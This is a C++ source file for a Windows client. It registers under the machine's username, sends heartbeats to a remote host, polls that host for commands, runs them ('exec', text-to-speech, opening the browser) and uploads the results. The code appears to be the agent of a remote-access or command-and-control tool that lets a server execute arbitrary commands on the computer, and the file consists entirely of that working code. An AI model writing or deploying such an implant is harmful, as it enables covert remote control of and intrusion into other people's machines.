#include "Client.h"

// modules
#include "Exec.h"
#include "TTS.h"
#include "Helpers.h"
#include "Browser.h"

#include <windows.h>
#include <Lmcons.h>

#include <iostream>
#include <algorithm>

std::string Client::GetUsername() {
	char ptr[UNLEN + 1];
	DWORD length = UNLEN + 1;
	GetUserName(ptr, &length);

	std::string result(ptr, length - 1);
	std::replace(result.begin(), result.end(), ' ', '_');
	return result;
}

ProcessMap Client::Create() {
	ProcessMap result;
	
	SafeAdd(Exec::Create(),		result, OP_EXEC);
	SafeAdd(TTS::Create(),		result, OP_TTS);
	SafeAdd(Browser::Create(),	result, OP_BROWSER);

	return result;
}

void Client::Destroy() {
	TTS::Destroy();
	Browser::Destroy();
}

MonitorCallback Client::GetMonitor(std::string const & username) {
	const std::wstring domain = Helpers::ToUTF16("/dms/" + username + "/state.json", CP_UTF8);
	return ([domain]() -> std::string {
		const REST::Response response = REST::SendRequest(HOST, domain, L"GET");
		return response.body.substr(1, response.body.length() - 2);
	});
}

PulseCallback Client::GetPulse(
	std::string const & username, 
	REST::ResponseCallback callback
) {
	const std::wstring domain = Helpers::ToUTF16("/dms/" + username + "/state.json", CP_UTF8);
	return ([domain, callback]() {
		REST::SendRequestAsync(HOST, domain, L"PUT", "\"ALIVE\"", callback);
	});
}

PollCallback Client::GetPoll(std::string const & username) {
	const std::wstring domain = Helpers::ToUTF16("/dms/" + username + "/cmd.json", CP_UTF8);
	return ([domain]() -> std::string {
		const REST::Response response = REST::SendRequest(HOST, domain, L"GET");
		return response.body.substr(1, response.body.length() - 2);
	});
}

bool Client::SafeAdd(
	Process const & process,
	ProcessMap & map,
	unsigned const & id
) {
	if (!process) 
		return false;

	map[id] = process;
	return true;
}

std::string Client::ProcessCommand(
	std::string const & message, 
	ProcessMap const & map
) {
	const size_t commandSize = message.find_first_of(' ');
	const std::string command = message.substr(0, commandSize);
	const std::string body = message.substr(commandSize + 1);

	if (command == "exec")
		return map.at(OP_EXEC)(body);
	else if (command == "tts")
		return map.at(OP_TTS)(body);
	else if (command == "open")
		return map.at(OP_BROWSER)(body);
	else if (command == "exit")
		exit(0);

	return "";
}

void Client::Respond(
	std::string const & username, 
	std::string const & body,
	REST::ResponseCallback callback
) {
	const std::wstring domain = Helpers::ToUTF16("/dms/" + username + "/response.json", CP_UTF8);
	REST::SendRequestAsync(HOST, domain, L"PUT", body, callback);
}

void Client::ResponseHandler(REST::Response response) {
	//if (!response.isSuccessful)
	//	std::cout << "\n===== WARNING =====\n" << response.body << "\n=====   END   =====\n";
	std::cout << response.body << '\n';
}

